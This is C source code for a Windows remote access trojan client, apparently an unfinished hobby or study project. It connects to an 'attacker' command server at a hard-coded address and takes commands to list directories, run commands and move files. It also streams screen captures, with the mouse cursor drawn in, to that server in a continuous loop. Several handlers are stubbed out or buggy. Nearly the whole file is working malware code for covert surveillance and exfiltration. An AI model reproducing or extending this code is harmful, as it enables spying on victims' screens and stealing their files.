#define _WINSOCK_DEPRECATED_NO_WARNINGS // TODO - fix this

//#include <windows.h> // is this needed?
#include <winsock2.h> // windows socket header
#include <shlwapi.h> // useful functions for directory traversal
#include <stdio.h> // standard input/output
#include <string.h> // useful string functions

#pragma comment(lib,"ws2_32.lib") // tell the linker to link the winsock library
#pragma comment(lib, "Shlwapi.lib")

// attacker IP and primary communication port
//#define CMD_SERVER_ADDR "127.0.0.1"
#define CMD_SERVER_ADDR "192.168.56.1"
#define CMD_SERVER_PORT 8080

// change directory and list directory contents
#define CHANGE_DIR 1
#define LIST_DIR 2
// upload and download files (from attacker's perspective)
#define UPLOAD 3
#define DOWNLOAD 4
// run an arbitrary comamnd
#define RUN_CMD 5
// start and end video, mouse, and audio streams
#define START_VIDEO 6
#define END_VIDEO 7
#define START_MOUSE 8
#define END_MOUSE 9
#define START_AUDIO 10
#define END_AUDIO 11
#define START_KEYS 13
#define END_KEYS 14
// end the process
#define KILL_PROC 12
// print the rest of the message to provide useful info
#define PRINT_INFO 15
// inform the attacker what the current directory is
#define NEW_CURR_DIR 16

// define useful globals
char currDir[MAX_PATH]; // name of the current directory
SOCKET mainSock; // main socket used to receive commands and send info

void test();

// helper function for exiting on error
void exitOnError() {
	printf("Exiting program...\n");
	exit(1);
}

// helper function to send info messages to the attacker server
// "code" is the #DEFINE associated with the data being sent
// assumes that the string passed has a null-terminator
// TODO - won't always correctly send non-string data
void sendData(char code, char* data) {
	printf("Sending data to attacker server...\n");
	// init local vars
	int bytesToSend = strlen(data) + 1; // length of data + null terminator + 1 byte for PRINT_INFO code
	char* buff = (char*)malloc(bytesToSend);
	int bytesSent = 0;
	int retCode;
	int repeats = 0;
	// set up the buffer for the first try of sending data
	buff[0] = code;
	memcpy((char*)(buff + 1), data, strlen(data));

	// loop until all data is sent
	do {
		retCode = send(mainSock, buff, bytesToSend - bytesSent, 0);
		if (retCode == SOCKET_ERROR) {
			printf("Could not send data: %d\n", WSAGetLastError());
			exitOnError();
		}
		bytesSent += retCode;
		if (bytesSent < bytesToSend) { // we need to loop again
			printf("Could not send all data in one attempt! Looping to send remaining data...\n");
			memmove((char*)(buff + 1), (char*)(buff + bytesSent), bytesToSend - retCode);
			repeats++;
		}
	} while (bytesSent < bytesToSend + repeats);
	printf("Data has been sent!\n");
	printf("%s\n", buff);
	free(buff);
}

/*
* Change the current directory - used for directory traversal
* All file and directory related commands will use the current directory as the default location
*/
void changeDirectory(char* dirName) {
	int newLen = strnlen(dirName, 4096);
	int currLen = strnlen(currDir, MAX_PATH);
	char buff[MAX_PATH];
	// check the new path length
	if (newLen + currLen + 1 > MAX_PATH) {
		sendData(PRINT_INFO, "Path name is too long!\n\0");
		return;
	}
	// change any '/' to be '\'
	for (int i = 0; i < MAX_PATH; i++) {
		if (dirName[i] == '/') {
			dirName[i] = '\\'; }
	}
	// concatenate the strings and check if it's a valid directory
	memcpy(buff, currDir, MAX_PATH);
	strcat_s(buff, MAX_PATH, "\\");
	strcat_s(buff, MAX_PATH, dirName);
	printf("Checking if \"%s\" is a directory...\n", buff);
	if (PathIsDirectoryA(buff)) {
		if (!PathCanonicalizeA(currDir, buff)) {
			printf("Failed to canonicalize path name \"%s\" with error %d\n\0", buff, GetLastError());
		} else {
			printf("Directory exists!\n");
			sendData(NEW_CURR_DIR, currDir);
		}
	} else {
		sendData(PRINT_INFO, "Directory does not exist!\n\0");
	}
}

/*
* List the contents of the current directory
* TODO - handle optional argument for directory to list contents of
*/
void listDirectoryContents() {
	HANDLE findHandle;
	WIN32_FIND_DATAA fileData;
	char searchPath[MAX_PATH];

	// build the search path with a simple copy + concat
	memcpy(searchPath, currDir, MAX_PATH);
	strcat_s(searchPath, MAX_PATH, "\\*.*");
	printf("Listing directory contents using search path: %s\n", searchPath);

	// get the first result
	findHandle = FindFirstFileA(searchPath, &fileData);
	if (findHandle == INVALID_HANDLE_VALUE) {
		printf("Error when attempting to find first file: %d\n", GetLastError());
		return;
	}
	sendData(PRINT_INFO, ""); // formatting on attacker side

	// loop through the rest of the files
	do {
		sendData(PRINT_INFO, fileData.cFileName);
	} while (FindNextFileA(findHandle, &fileData));

	// check the exit error code
	DWORD e = GetLastError();
	if (e != ERROR_NO_MORE_FILES) {
		printf("Error when attempting to find next file: %d\n", e); }

	// close the handle and return
	FindClose(findHandle);
}

/*
* Handle commands from the attacker server
* Return the #DEFINE associated with the command
*/
char handleCommand(char* buffer) {
	// get the command sent
	char cmd = buffer[0];
	// check what the command was and call the appropriate function
	if (cmd == CHANGE_DIR) { // TODO - complete this later as QoL feature
		printf("Changing directory...\n");
		// shift the buffer left by one to get just the name of the directory to change to
		for (int i = 1; i < 4096 && buffer[i-1] != '\0'; i++) {
			buffer[i - 1] = buffer[i]; }
		printf("Changing to directory %s\n", buffer);
		changeDirectory(buffer);
	} else if (cmd == LIST_DIR) { // TODO - complete this later as QoL feature
		printf("Listing directoy contents\n");
		listDirectoryContents();
	} else if (cmd == DOWNLOAD) {
		printf("Uploading file to controller\n");
		// get the port to connect to then shift the buffer to be just the file name
		int port = (buffer[1] * 256) + buffer[2];
		for (int i = 3; i < 4096 && buffer[i - 1] != '\0'; i++) {
			buffer[i - 3] = buffer[i]; }
		printf("Uploading file %s on port %d\n", buffer, port);
		//uploadFile(port, buffer);
	} else if (cmd == UPLOAD) {
		printf("Downloading file from controller\n");
		// get the port to connect to then shift the buffer to be just the file name
		int port = (buffer[1] * 256) + buffer[2];
		for (int i = 3; i < 4096 && buffer[i - 1] != '\0'; i++) {
			buffer[i - 3] = buffer[i];
		}
		printf("Downloading file %s on port %d\n", buffer, port);
		//downloadFile(port, buffer);
	} else if (cmd == RUN_CMD) {
		printf("Running command prompt arguments...\n");
		// shift the buffer left by one to get just command and its arguments
		for (int i = 1; i < 4096 && buffer[i - 1] != '\0'; i++) {
			buffer[i - 1] = buffer[i]; }
		printf("Running \"%s\" from command prompt\n", buffer);
		//runCommandPrompt(buffer);
	} else if (cmd == START_VIDEO) {
		printf("Starting video stream...\n");
		// get the port to connect to
		int port = (buffer[1] * 256) + buffer[2];
		printf("Streaming video to attacker on port %d\n", port);
		//streamVideo(port);
	} else if (cmd == END_VIDEO) {
		// TODO - determine how best to stop video stream
	} else if (cmd == START_MOUSE) {
		printf("Taking control of mouse...\n");
		// get the port to connect to
		int port = (buffer[1] * 256) + buffer[2];
		printf("Attacker is controlling mouse from port %d\n", port);
		//controlMouse(port);
	} else if (cmd == END_MOUSE) {
		// TODO - determine how best to stop mouse control
	} else if (cmd == START_AUDIO) {
		printf("Starting audio stream...\n");
		// get the port to connect to
		int port = (buffer[1] * 256) + buffer[2];
		printf("Streaming audio to attacker on port %d\n", port);
		//streamAudio(port);
	} else if (cmd == END_AUDIO) {
		// TODO - determine how best to stop audio stream
	} else if (cmd == START_KEYS) {
		printf("Taking control of keyboard...\n");
		// get the port to connect to
		int port = (buffer[1] * 256) + buffer[2];
		printf("Attacker is controlling keyboard from port %d\n", port);
		//controlKeyboard(port);
	} else if (cmd == END_KEYS) {
		// TODO - determine how best to stop keyboard control
	} else if (cmd == KILL_PROC) {
		printf("Ending process...\n");
	} else {
		printf("Unknown command received: %d\n", cmd);
	}
	return cmd;
}

/*
* Connect to the primary command server
* This is where we'll get the commands to do stuff
* Secondary connections will be set up for streaming other data
*/
void connectToCommandServer() {
	struct sockaddr_in server;
	int retCode;
	char cmd;
	char buffer[4096];

	// create the TCP socket
	mainSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (mainSock == INVALID_SOCKET) {
		printf("Could not create socket: %d\n", WSAGetLastError());
		exitOnError();
	}

	// set the server info structure
	server.sin_addr.s_addr = inet_addr(CMD_SERVER_ADDR);
	server.sin_family = AF_INET;
	server.sin_port = htons(CMD_SERVER_PORT);

	// connect to the attacker command server
	if (connect(mainSock, (struct sockaddr*)&server, sizeof(server)) != 0) {
		printf("Could not connect to command server! Error code: %d\n", WSAGetLastError());
		exitOnError();
	} else {
		printf("Connected to command server\n");
	}

	// TESTING TODO - remove once done testing
	test();

	// get and process commands from the attacker
	do {
		// get the next command and check for errors or a closed connection
		retCode = recv(mainSock, buffer, 4096, 0);
		if (retCode == 0) {
			printf("Connection closed...\nExiting program...\n");
			return 0;
		} else if (retCode < 0) {
			printf("Recv failed with error: %d\n", WSAGetLastError());
			exitOnError();
		}
		// if we got this far, we have a valid message to process
		cmd = handleCommand(buffer);
	} while (cmd != KILL_PROC);

	// TODO - kill the connection gracefully
}

// TODO - remove once done using
int frames = 0;
void videoStreamTest() {
	// code modified from https://stackoverflow.com/questions/3291167/how-can-i-take-a-screenshot-in-a-windows-application
	// get the device context of the screen
	// DC contains drawing info
	// technically a handle to a DC cuz the system hides everything from us
	// once done using, call ReleaseDC(NULL, hScreenDC)
	HDC hScreenDC = GetDC(NULL);
	// and a device context to put it in
	// a "memory DC" exists only in memory
	// need to select a bitmap into the DC before it can be used
	// this is done using CreateCompatibleBitmap()
	// this specified the height, width, and color organization
	// use DeleteDC to get rig of the DC once done using it
	HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

	// after ~5000 frames, this value drops to a massive negative number
	// the 2's complement hex of this number is CCCCCCCC
	int width = GetDeviceCaps(hScreenDC, HORZRES);
	int height = GetDeviceCaps(hScreenDC, VERTRES);

	// create a bitmap compatible with the screen HDC
	// we can specify the width and height of the bitmap
	// since this is for the screen, we use the screen width and height
	// the color format/organization is selected automatically to match the screen DC
	// the bitmap is "selected into" the screen DC
	// delete this bitmap with DeleteObject() once done using it
	HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);

	// select the screen-compitable bitmap into the memory DC
	// this will allow us to use the memory DC
	// the new bitmap returned replaces the old bitmap
	// if an error occurs, this function return NULL (might want to check for that)
	// might want to delete this bitmap once we're done using it?
	HBITMAP holdBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);

	// do a bit blit from the screen DC to the memory DC
	if (!BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY)) {
		printf("Error: %d\n", GetLastError());
	}

	// draw the mouse cursor onto the image
	// modified from https://stackoverflow.com/questions/1628919/capture-screen-shot-with-mouse-cursor
	CURSORINFO cursor;
	cursor.cbSize = sizeof(CURSORINFO);
	if (!GetCursorInfo(&cursor)) {
		printf("Error getting cursor info: %d\n", GetLastError());
		exitOnError();
	}
	if (cursor.flags == CURSOR_SHOWING) {
		ICONINFOEXA info;
		info.cbSize = sizeof(ICONINFOEXA);
		GetIconInfoExA(cursor.hCursor, &info);
		int x = cursor.ptScreenPos.x - info.xHotspot;
		int y = cursor.ptScreenPos.y - info.yHotspot;
		BITMAP bmpCursor;
		bmpCursor.bmType = 0;
		GetObject(info.hbmColor, sizeof(bmpCursor), &bmpCursor);
		DrawIconEx(hMemoryDC, x, y, cursor.hCursor, bmpCursor.bmWidth, bmpCursor.bmHeight,
			0, NULL, DI_NORMAL);
	}

	// pull the bitmap out of the HDC memory
	hBitmap = (HBITMAP)SelectObject(hMemoryDC, holdBitmap);

	// clean up
	DeleteDC(hMemoryDC);
	DeleteDC(hScreenDC);
	if (!DeleteObject(holdBitmap)) { // do we want to delete this???
		printf("Could not delete holBitmap\n");
	}

	// now your image is held in hBitmap. You can save it or do whatever with it
	
	// code from https://stackoverflow.com/questions/22572849/c-how-to-send-hbitmap-over-socket
	BITMAP Bmp;
	BITMAPINFO Info;
	HDC DC = CreateCompatibleDC(NULL);
	HBITMAP OldBitmap = (HBITMAP)SelectObject(DC, hBitmap);
	GetObject(hBitmap, sizeof(Bmp), &Bmp);

	Info.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	Info.bmiHeader.biWidth = width = Bmp.bmWidth;
	Info.bmiHeader.biHeight = height = Bmp.bmHeight;
	Info.bmiHeader.biPlanes = 1;
	Info.bmiHeader.biBitCount = Bmp.bmBitsPixel;
	Info.bmiHeader.biCompression = BI_RGB;
	int fileSize = ((width * Bmp.bmBitsPixel + 31) / 32) * 4 * height;
	Info.bmiHeader.biSizeImage = fileSize;

	char * Pixels = malloc(Info.bmiHeader.biSizeImage);
	char * pRev = malloc(Info.bmiHeader.biSizeImage);
	GetDIBits(DC, hBitmap, 0, height, &Pixels[0], &Info, DIB_RGB_COLORS);
	SelectObject(DC, OldBitmap);
	//height = height < 0 ? -height : height;
	DeleteDC(DC);
	
	// send data
	int bytesToSend = fileSize;
	int bytesSent = 0;
	int retCode;
	int repeats = 0;

	// send frame size if first frame
	if (frames == 0) {
		int buff[3];
		buff[0] = width;
		buff[1] = height;
		buff[2] = fileSize;
		retCode = send(mainSock, buff, 12, 0);
		if (retCode == SOCKET_ERROR) {
			printf("Could not send data: %d\n", WSAGetLastError());
			exitOnError();
		}
	}

	// print the size of the bitmap for the current frame - used for debug
	printf("Frame %d x & y: %d x %d\n", frames++, width, height);

	// vertically flip the image - just something with how the screen capture works
	for (int row = 0; row < height; row++) {
		for (int b = 0; b < width * 4; b++) {
			int idx = ((height - row - 1) * width * 4) + b;
			int rIdx = (row * width * 4) + b;
			pRev[rIdx] = Pixels[idx];
		}
	}

	// swap the red and blue bytes (seems to be a problem on this side)
	// TODO - why exactly does this happen???
	for (int i = 0; i < fileSize; i += 4) {
		char temp = pRev[i];
		pRev[i] = pRev[i + 2];
		pRev[i + 2] = temp;
	}

	// loop until all data is sent
	do {
		retCode = send(mainSock, pRev, bytesToSend - bytesSent, 0);
		if (retCode == SOCKET_ERROR) {
			printf("Could not send data: %d\n", WSAGetLastError());
			exitOnError();
		}
		bytesSent += retCode;
		if (bytesSent < bytesToSend) { // we need to loop again
			printf("Could not send all data in one attempt! Looping to send remaining data...\n");
			memmove(Pixels, (char*)(pRev + bytesSent), bytesToSend - retCode);
			repeats++;
		}
	} while (bytesSent < bytesToSend + repeats);

	free(Pixels);
	free(pRev);
	if (!DeleteObject(hBitmap)) { // do we want to delete this???
		printf("Could not delete hBitmap\n");
	}
}

// TODO - remove testing function once no longer needed
// currently testing video streaming to attacker server
void test() {
	while (1 == 1) {
		videoStreamTest();
		Sleep(33);
	}
}

int main(int argc, char* argv[]) {
	WSADATA wsa;
	// initialize winsock
	int retCode = WSAStartup(MAKEWORD(2, 2), &wsa);
	if (retCode != 0) {
		printf("WSAStartup failed with error: %d\n", retCode);
		exitOnError();
	}
	// get the current directory
	GetModuleFileNameA(NULL, currDir, MAX_PATH);
	for (int i = MAX_PATH - 1; i >= 0; i--) {
		if (currDir[i] == '\\' || currDir[i] == '/') {
			currDir[i] = '\0';
			break;
		}
		currDir[i] = '\0';
	}
	printf("Running from \"%s\"\n", currDir);
	// connect to the command server
	connectToCommandServer();
	return 0;
}